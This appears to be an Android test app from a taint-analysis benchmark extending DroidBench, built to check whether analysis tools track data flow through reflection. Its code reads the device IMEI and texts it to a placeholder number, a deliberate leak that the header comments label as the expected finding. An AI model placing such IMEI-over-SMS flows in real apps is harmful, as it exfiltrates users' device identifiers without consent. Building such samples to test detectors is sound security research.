package ubc.yingying.reflection2test2;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;



/**
 * @Description The benchmark is an extension of DroidBench-Reflection-Reflection2.
 *
 * When there are two abstract base classes and several derived class from the base classes,
 * the tool should be able to distinguish which base class the derived class comes from
 *
 * (Specific to this testcase, the tool should know ConcreteClass3 and ConcreteClass4 are derived
 * from BaseClass2, rather than BaseClass1)
 *
 *
 * @ExpectedSources:
 * line 51: getDeviceId()
 * line 58: getDeviceId()
 *
 * @ExpectedSinks:
 * line 52: [leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 * line 59: [no leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 *
 * @NumberOfExpectedLeaks: 1
 *
 * @FlowPaths:
 * Path1:
 * line 51: bc3.imei = telephonyManager.getDeviceId(); -->
 * line 52: sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  --> leak
 *
 */

public class MainActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {

            TelephonyManager telephonyManager3 = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager sms3 = SmsManager.getDefault();
            BaseClass2 bc3 = (BaseClass2) Class.forName("ubc.yingying.reflection2test2.ConcreteClass3").newInstance();
            bc3.imei = telephonyManager3.getDeviceId(); // source
            sms3.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  // sink, leak


            TelephonyManager telephonyManager4 = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager sms4 = SmsManager.getDefault();
            BaseClass2 bc4 = (BaseClass2) Class.forName("ubc.yingying.reflection2test2.ConcreteClass4").newInstance();
            bc4.imei = telephonyManager4.getDeviceId(); // source
            sms4.sendTextMessage("+49 4444", null, bc4.foo(), null,null); // sink, no leak


        } catch (InstantiationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }




}
